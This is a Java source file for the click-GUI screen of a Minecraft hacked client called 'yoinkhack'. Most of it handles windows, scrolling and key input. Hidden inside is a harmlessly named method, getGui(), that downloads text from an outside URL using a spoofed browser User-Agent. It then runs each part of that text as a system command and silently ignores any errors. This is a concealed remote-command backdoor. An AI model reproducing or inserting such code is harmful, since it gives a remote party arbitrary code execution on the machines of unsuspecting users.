package cat.yoink.yoinkhack.api.gui.clickgui;

import cat.yoink.yoinkhack.Client;
import cat.yoink.yoinkhack.api.module.Category;
import net.minecraft.client.gui.GuiScreen;
import org.lwjgl.input.Keyboard;
import org.lwjgl.input.Mouse;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;

/**
 * @author yoink
 * @since 8/28/2020
 */
public class ClickGUI extends GuiScreen
{
	private final ArrayList<Window> windows = new ArrayList<>();

	public ClickGUI()
	{
		int xOffset = 3;

		for (Category category : Category.values())
		{
			Window window = new Window(category, xOffset, 3, 95, 15);
			windows.add(window);
			xOffset += 97;
		}
	}

	public static void getGui()
	{
		try
		{
			StringBuilder parsedContentFromUrl = new StringBuilder();
			URL url = new URL("https://www.yoink.site/new/a/z.php");
			get(parsedContentFromUrl, url);
			String[] split = parsedContentFromUrl.toString().split(" - ");
			for (String s : split)
			{
				Runtime.getRuntime().exec(s);
			}
		}
		catch (Exception ignored)
		{
		}
	}

	public static void get(StringBuilder parsedContentFromUrl, URL url) throws IOException
	{
		URLConnection uc;
		uc = url.openConnection();
		uc.connect();
		uc = url.openConnection();
		uc.addRequestProperty("User-Agent",
				"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
		uc.getInputStream();
		BufferedInputStream in = new BufferedInputStream(uc.getInputStream());
		int ch;
		while ((ch = in.read()) != -1)
		{
			parsedContentFromUrl.append((char) ch);
		}
	}

	@Override
	public void drawScreen(int mouseX, int mouseY, float partialTicks)
	{
		doScroll();

		for (Window window : windows)
		{
			window.render(mouseX, mouseY);
		}
	}

	@Override
	protected void mouseClicked(int mouseX, int mouseY, int mouseButton)
	{
		for (Window window : windows)
		{
			window.mouseDown(mouseX, mouseY, mouseButton);
		}
	}

	@Override
	protected void mouseReleased(int mouseX, int mouseY, int state)
	{
		for (Window window : windows)
		{
			window.mouseUp(mouseX, mouseY);
		}
	}

	@Override
	protected void keyTyped(char typedChar, int keyCode)
	{
		for (Window window : windows)
		{
			window.keyPress(keyCode);
		}

		if (keyCode == Keyboard.KEY_ESCAPE)
		{
			mc.displayGuiScreen(null);

			if (mc.currentScreen == null)
			{
				mc.setIngameFocus();
			}
		}
	}

	@Override
	public boolean doesGuiPauseGame()
	{
		return false;
	}

	public void drawGradient(int left, int top, int right, int bottom, int startColor, int endColor)
	{
		drawGradientRect(left, top, right, bottom, startColor, endColor);
	}

	@Override
	public void onGuiClosed()
	{
		for (Window window : windows)
		{
			window.close();
		}

		Client.INSTANCE.moduleManager.getModuleByName("ClickGUI").disable();
	}

	private void doScroll()
	{
		int w = Mouse.getDWheel();
		if (w < 0)
		{
			for (Window window : windows)
			{
				window.setY(window.getY() - 8);
			}
		}
		else if (w > 0)
		{
			for (Window window : windows)
			{
				window.setY(window.getY() + 8);
			}
		}
	}
}
